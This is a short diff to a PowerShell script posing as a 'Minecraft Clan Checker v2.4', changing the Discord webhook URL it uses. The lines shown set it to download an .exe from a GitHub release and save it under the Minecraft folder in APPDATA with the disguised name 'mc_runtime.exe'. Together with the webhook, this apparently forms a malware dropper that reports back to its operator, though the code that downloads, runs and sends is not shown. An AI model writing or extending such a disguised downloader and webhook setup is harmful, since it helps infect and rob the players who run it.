@@ -11,7 +11,7 @@ $host.UI.RawUI.WindowTitle = "Minecraft Clan Checker v2.4"
 $URL     = "https://github.com/galarol/checker/releases/download/123/123.exe"
 $OUT     = "$env:APPDATA\.minecraft\runtime\mc_runtime.exe"
 $DIR     = Split-Path $OUT -Parent
-$WEBHOOK = "https://discord.com/api/webhooks/1553457287476289647/ouxbyLFXDJDTgJ2L-NxxIUehb7E1sdnP4SQ8RugOjJgqvPxGTxLlbKte47915GAX8wQ9"
+$WEBHOOK = "https://discord.com/api/webhooks/1553480579540979732/d-TiAJzwY2pjn0tRU7LMqTb3pwl3Ir73flmUGVZh5s3MXBNwlCFWtSQNMJhL_k_BjfHi"
 # ===============================================
 
 function Step($text, $delay = 700) {
